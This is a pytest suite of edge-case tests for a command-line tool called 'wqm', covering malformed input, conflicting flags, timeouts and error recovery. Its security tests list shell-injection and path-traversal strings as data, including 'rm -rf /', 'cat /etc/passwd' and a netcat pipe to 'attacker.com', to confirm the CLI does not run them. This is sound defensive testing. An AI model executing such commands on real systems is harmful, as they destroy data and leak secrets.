"""
Comprehensive Edge Case Tests for Unified CLI Interface

Tests malformed input, conflicting options, timeout scenarios,
and interruption handling for the complete wqm CLI system.

Task 251: Edge case testing for unified CLI interface.
"""

import os
import signal
import subprocess
import sys
import threading
import time
from pathlib import Path
from unittest.mock import MagicMock, Mock, call, patch

import pytest
from typer.testing import CliRunner

# Add src paths for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src" / "python"))

# Set CLI mode before any imports
os.environ["WQM_CLI_MODE"] = "true"
os.environ["WQM_LOG_INIT"] = "false"

try:
    from wqm_cli.cli.advanced_features import smart_defaults
    from wqm_cli.cli.error_handling import ErrorContext, error_handler
    from wqm_cli.cli.help_system import help_system
    from wqm_cli.cli.main import app, handle_async_command
    CLI_AVAILABLE = True
except ImportError as e:
    CLI_AVAILABLE = False
    print(f"Warning: CLI modules not available: {e}")


@pytest.mark.skipif(not CLI_AVAILABLE, reason="CLI modules not available")
class TestMalformedInputHandling:
    """Test handling of malformed CLI input."""

    @pytest.fixture
    def runner(self):
        """Create CLI test runner."""
        return CliRunner()

    def test_invalid_unicode_arguments(self, runner):
        """Test CLI handles invalid unicode in arguments."""
        # Test with various problematic unicode sequences
        problematic_inputs = [
            "\ud800",  # Unpaired surrogate
            "\udc00",  # Unpaired low surrogate
            "test\x00null",  # Null byte
            "test\x7f\x80\x81",  # Mixed ASCII and non-UTF8
        ]

        for bad_input in problematic_inputs:
            try:
                result = runner.invoke(app, ["help", "suggest", bad_input])
                # Should not crash, even if it returns error
                assert result.exit_code is not None
            except UnicodeError:
                # Unicode errors are acceptable for truly malformed input
                pass

    def test_extremely_long_arguments(self, runner):
        """Test CLI with extremely long arguments."""
        long_arg = "a" * 100000  # 100KB argument

        result = runner.invoke(app, ["help", "suggest", long_arg])
        # Should handle gracefully without memory issues
        assert result.exit_code is not None

    def test_many_repeated_flags(self, runner):
        """Test CLI with many repeated flags."""
        # Create command with many repeated flags
        args = ["--verbose"] * 1000 + ["help", "discover"]

        result = runner.invoke(app, args)
        # Should handle gracefully
        assert result.exit_code is not None

    @pytest.mark.skip(reason="Test invokes actual CLI commands (search, memory, config) that require service connections and hang")
    def test_nested_quotes_in_arguments(self, runner):
        """Test arguments with complex nested quotes."""
        complex_args = [
            'memory add "He said \'Hello "World"\' to me"',
            "config set key 'value with \"quotes\" inside'",
            "search project \"test\\\"escaped\\\"quotes\"",
        ]

        for arg_string in complex_args:
            # Split the string properly for testing
            import shlex
            try:
                args = shlex.split(arg_string)
                result = runner.invoke(app, args)
                assert result.exit_code is not None
            except ValueError:
                # Some quote combinations might be unparseable
                pass

    def test_binary_data_in_arguments(self, runner):
        """Test CLI with binary data in arguments."""
        binary_data = b'\x00\x01\x02\xff\xfe\xfd'.decode('latin1')

        result = runner.invoke(app, ["help", "suggest", binary_data])
        # Should not crash
        assert result.exit_code is not None

    def test_control_characters_in_arguments(self, runner):
        """Test CLI with control characters."""
        control_chars = "test\r\n\t\b\f\a\v"

        result = runner.invoke(app, ["help", "suggest", control_chars])
        assert result.exit_code is not None

    def test_empty_and_whitespace_arguments(self, runner):
        """Test CLI with empty and whitespace-only arguments."""
        whitespace_args = [
            "",
            " ",
            "\t",
            "\n",
            "   \t\n   ",
            "\u00A0\u2000\u2001",  # Various unicode spaces
        ]

        for arg in whitespace_args:
            result = runner.invoke(app, ["help", "suggest", arg])
            assert result.exit_code is not None

    def test_malformed_flag_combinations(self, runner):
        """Test malformed flag combinations."""
        malformed_flags = [
            ["--flag=value=extra"],
            ["--flag", "=value"],
            ["--=value"],
            ["---triple-dash"],
            ["-"],
            ["--"],
            ["--flag-"],
        ]

        for flags in malformed_flags:
            result = runner.invoke(app, flags + ["help", "discover"])
            # Should handle malformed flags gracefully
            assert result.exit_code is not None


@pytest.mark.skipif(not CLI_AVAILABLE, reason="CLI modules not available")
class TestConflictingOptionsHandling:
    """Test handling of conflicting CLI options."""

    @pytest.fixture
    def runner(self):
        """Create CLI test runner."""
        return CliRunner()

    def test_mutually_exclusive_flags(self, runner):
        """Test mutually exclusive flags."""
        # These should be handled gracefully even if conflicting
        result = runner.invoke(app, ["--verbose", "--quiet", "help", "discover"])
        assert result.exit_code is not None

    def test_duplicate_flags(self, runner):
        """Test duplicate flags."""
        result = runner.invoke(app, ["--debug", "--debug", "help", "discover"])
        assert result.exit_code is not None

    def test_contradictory_config_flags(self, runner):
        """Test contradictory configuration flags."""
        result = runner.invoke(app, [
            "--config", "/path/1",
            "--config", "/path/2",
            "help", "discover"
        ])
        assert result.exit_code is not None

    def test_invalid_flag_values(self, runner):
        """Test invalid values for flags."""
        # These might cause typer to handle validation
        invalid_combinations = [
            ["--config", ""],  # Empty config path
            ["--config", "\x00"],  # Null byte in path
            ["--config", "/path/with\nnewline"],  # Newline in path
        ]

        for args in invalid_combinations:
            result = runner.invoke(app, args + ["help", "discover"])
            assert result.exit_code is not None

    def test_numeric_overflow_in_arguments(self, runner):
        """Test numeric overflow in numeric arguments."""
        # While most commands don't take numeric args directly,
        # test that parsing doesn't break with extreme values
        extreme_numbers = [
            str(sys.maxsize * 2),
            "-" + str(sys.maxsize * 2),
            "1e1000",
            "-1e1000",
            "inf",
            "-inf",
            "nan",
        ]

        for num in extreme_numbers:
            result = runner.invoke(app, ["help", "suggest", num])
            assert result.exit_code is not None


@pytest.mark.skipif(not CLI_AVAILABLE, reason="CLI modules not available")
class TestTimeoutAndInterruptionScenarios:
    """Test timeout and interruption handling."""

    @pytest.fixture
    def runner(self):
        """Create CLI test runner."""
        return CliRunner()

    @pytest.mark.skip(reason="Test design flaw: async command blocks for 10s, KeyboardInterrupt never reached - causes test hang")
    def test_keyboard_interrupt_during_command(self):
        """Test KeyboardInterrupt during command execution."""
        async def slow_command():
            await asyncio.sleep(10)
            return "should not reach here"

        import asyncio

        with pytest.raises(SystemExit):
            with patch('builtins.print'):
                handle_async_command(slow_command(), debug=False)
                # Simulate keyboard interrupt
                raise KeyboardInterrupt()

    def test_sigterm_handling(self):
        """Test SIGTERM signal handling."""
        # This test may not work in all environments
        if sys.platform != 'win32':
            def timeout_handler(signum, frame):
                raise TimeoutError("Test timeout")

            old_handler = signal.signal(signal.SIGTERM, timeout_handler)
            try:
                # Test that CLI can handle signals gracefully
                result = handle_async_command(self._quick_async_task(), debug=False)
                assert result == "quick"
            finally:
                signal.signal(signal.SIGTERM, old_handler)

    async def _quick_async_task(self):
        """Quick async task for testing."""
        return "quick"

    @patch('wqm_cli.cli.error_handling.Confirm.ask', return_value=False)
    @patch('wqm_cli.cli.error_handling.console')
    def test_process_killed_during_subprocess_execution(self, mock_console, mock_confirm):
        """Test handling when subprocess is killed."""
        with patch('subprocess.run') as mock_run:
            # Simulate subprocess being killed
            mock_run.side_effect = subprocess.TimeoutExpired("test", 1)

            context = ErrorContext(command="test")
            exception = subprocess.TimeoutExpired("test", 1)

            # Should handle subprocess timeout gracefully
            error = error_handler.handle_exception(exception, context)
            assert error is not None

    def test_concurrent_command_execution(self):
        """Test concurrent command execution scenarios."""
        def run_command():
            runner = CliRunner()
            return runner.invoke(app, ["help", "discover"])

        threads = []
        results = []

        # Run multiple CLI commands concurrently
        for _ in range(5):
            thread = threading.Thread(target=lambda: results.append(run_command()))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join(timeout=10)

        # All should complete without deadlock
        assert len(results) <= 5  # Some may still be running

    def test_memory_pressure_scenarios(self):
        """Test CLI behavior under memory pressure."""
        # Create large data structures to simulate memory pressure
        large_data = []
        try:
            for _i in range(1000):
                large_data.append("x" * 10000)  # 10KB strings

            runner = CliRunner()
            result = runner.invoke(app, ["help", "discover"])
            assert result.exit_code is not None

        except MemoryError:
            # Expected under extreme memory pressure
            pass
        finally:
            del large_data

    def test_filesystem_permission_errors(self, runner):
        """Test CLI behavior with filesystem permission issues."""
        # Test with paths that likely don't have write permissions
        restricted_paths = [
            "/root/.config",  # Likely no access
            "/etc/restricted",  # System directory
            "/dev/null/config.yaml",  # Invalid path
        ]

        for path in restricted_paths:
            result = runner.invoke(app, ["--config", path, "help", "discover"])
            # Should handle permission errors gracefully
            assert result.exit_code is not None

    def test_command_execution_with_resource_limits(self):
        """Test command execution with artificial resource limits."""
        import resource
        import threading

        def limited_execution():
            try:
                # Set memory limit (if supported on platform)
                resource.setrlimit(resource.RLIMIT_AS, (100 * 1024 * 1024, -1))  # 100MB
            except (OSError, ValueError):
                pass  # Not supported on all platforms

            runner = CliRunner()
            return runner.invoke(app, ["help", "discover"])

        # Run in separate thread to isolate resource limits
        result_container = []
        thread = threading.Thread(target=lambda: result_container.append(limited_execution()))
        thread.start()
        thread.join(timeout=15)

        if result_container:
            assert result_container[0].exit_code is not None


@pytest.mark.skipif(not CLI_AVAILABLE, reason="CLI modules not available")
class TestComplexErrorRecoveryScenarios:
    """Test complex error recovery scenarios."""

    def test_cascading_error_recovery(self):
        """Test recovery when recovery actions themselves fail."""
        # Create an error that would trigger recovery actions
        context = ErrorContext(command="test")
        exception = ConnectionRefusedError("Connection refused")

        with patch('subprocess.run', side_effect=Exception("Recovery failed")):
            error = error_handler.handle_exception(exception, context, show_traceback=False)

        assert error is not None
        assert error.category.value == "connection"

    def test_error_recovery_with_malformed_commands(self):
        """Test error recovery suggestions with malformed commands."""
        context = ErrorContext(
            command="malformed\x00command",
            arguments=["arg\nwith\nnewlines"],
            flags={"invalid\tflag": "bad\rvalue"}
        )
        exception = ValueError("Test error")

        error = error_handler.handle_exception(exception, context, show_traceback=False)
        assert error is not None

    def test_circular_error_conditions(self):
        """Test handling of circular error conditions."""
        # Simulate a scenario where error handling itself causes errors
        context = ErrorContext(command="test")
        exception = Exception("Primary error")

        # Save original method
        original_display_error = error_handler._display_error

        with patch('wqm_cli.cli.error_handling.console.print', side_effect=Exception("Display error")):
            try:
                error_handler._display_error = Mock(side_effect=Exception("Display failed"))
                error_handler.handle_exception(exception, context)
            except Exception as e:
                # Should be the display error, not a crash in error handling
                assert "Display" in str(e) or isinstance(e, Exception)
            finally:
                # Restore original method to prevent test pollution
                error_handler._display_error = original_display_error

    @patch('wqm_cli.cli.error_handling.Confirm.ask', return_value=False)
    @patch('wqm_cli.cli.error_handling.console')
    def test_error_history_corruption_recovery(self, mock_console, mock_confirm):
        """Test recovery when error history becomes corrupted."""
        # Corrupt error history
        error_handler.last_errors = "not a list"

        context = ErrorContext(command="test")
        exception = ValueError("Test error")

        # Should recover gracefully from corrupted state
        try:
            error = error_handler.handle_exception(exception, context, show_traceback=False)
            assert error is not None
        except (TypeError, AttributeError):
            # Might raise TypeError or AttributeError due to corrupted state, which is acceptable
            pass
        finally:
            # Reset to clean state
            error_handler.last_errors = []

    @patch('wqm_cli.cli.error_handling.Confirm.ask', return_value=False)
    @patch('wqm_cli.cli.error_handling.console')
    def test_unicode_error_messages_in_recovery(self, mock_console, mock_confirm):
        """Test error recovery with unicode in error messages."""
        context = ErrorContext(command="test")
        exception = UnicodeDecodeError('utf-8', b'\xff', 0, 1, '🚨 Unicode error message 测试')

        error = error_handler.handle_exception(exception, context, show_traceback=False)
        assert error is not None


@pytest.mark.skipif(not CLI_AVAILABLE, reason="CLI modules not available")
class TestSystemIntegrationEdgeCases:
    """Test edge cases in system integration."""

    def test_environment_variable_injection_attacks(self):
        """Test protection against environment variable injection."""
        # Test with potentially dangerous environment values
        dangerous_env_values = [
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "${HOME}/../../../etc/passwd",
            "test\nMALICIOUS=value",
        ]

        for value in dangerous_env_values:
            with patch.dict(os.environ, {'TEST_VAR': value}):
                runner = CliRunner()
                result = runner.invoke(app, ["help", "discover"])
                # Should not execute any shell commands
                assert result.exit_code is not None

    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/../etc/passwd",
            "config/../../secret",
            "%2e%2e%2f%2e%2e%2f",  # URL encoded ../..
        ]

        runner = CliRunner()
        for path in dangerous_paths:
            result = runner.invoke(app, ["--config", path, "help", "discover"])
            # Should handle dangerous paths safely
            assert result.exit_code is not None

    def test_command_injection_protection(self):
        """Test protection against command injection."""
        injection_attempts = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test`whoami`",
            "test$(id)",
        ]

        runner = CliRunner()
        for injection in injection_attempts:
            result = runner.invoke(app, ["help", "suggest", injection])
            # Should not execute shell commands
            assert result.exit_code is not None

    def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion."""
        # Test with very large help queries
        large_query = "a" * 1000000  # 1MB query

        runner = CliRunner()
        result = runner.invoke(app, ["help", "suggest", large_query])
        # Should handle large inputs without exhausting resources
        assert result.exit_code is not None

    def test_concurrent_config_modification(self):
        """Test behavior with concurrent configuration modifications."""
        import json
        import tempfile

        # Create temporary config files
        config_files = []
        for i in range(5):
            fd, path = tempfile.mkstemp(suffix='.json')
            os.write(fd, json.dumps({"test": f"value_{i}"}).encode())
            os.close(fd)
            config_files.append(path)

        try:
            threads = []
            results = []

            def test_with_config(config_path):
                runner = CliRunner()
                result = runner.invoke(app, ["--config", config_path, "help", "discover"])
                results.append(result)

            # Start multiple threads with different configs
            for config_path in config_files:
                thread = threading.Thread(target=test_with_config, args=(config_path,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join(timeout=10)

            # All should complete without conflicts
            assert len(results) <= len(config_files)

        finally:
            # Cleanup
            for path in config_files:
                try:
                    os.unlink(path)
                except OSError:
                    pass

    def test_symlink_handling(self):
        """Test handling of symbolic links in paths."""
        if sys.platform != 'win32':  # Symlinks more reliable on Unix-like systems
            import tempfile

            with tempfile.TemporaryDirectory() as tmpdir:
                tmpdir_path = Path(tmpdir)

                # Create a symlink
                target_file = tmpdir_path / "target.txt"
                target_file.write_text("test content")

                symlink_file = tmpdir_path / "symlink.txt"
                try:
                    symlink_file.symlink_to(target_file)

                    runner = CliRunner()
                    result = runner.invoke(app, ["--config", str(symlink_file), "help", "discover"])
                    assert result.exit_code is not None

                except OSError:
                    # Symlink creation might fail due to permissions
                    pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
